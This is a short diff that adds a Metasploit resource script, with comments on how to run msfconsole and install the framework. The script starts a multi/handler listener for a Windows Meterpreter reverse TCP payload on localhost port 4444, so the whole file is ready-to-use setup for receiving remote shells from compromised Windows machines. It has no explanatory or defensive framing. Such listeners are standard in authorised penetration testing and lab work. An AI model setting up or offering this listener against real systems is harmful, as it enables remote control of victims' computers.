@@ -1,0 +1,9 @@
+# Metasploit resource script
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+exploit
+
+# Run: msfconsole -r metasploit.rc
+# Install: sudo apt install metasploit-framework
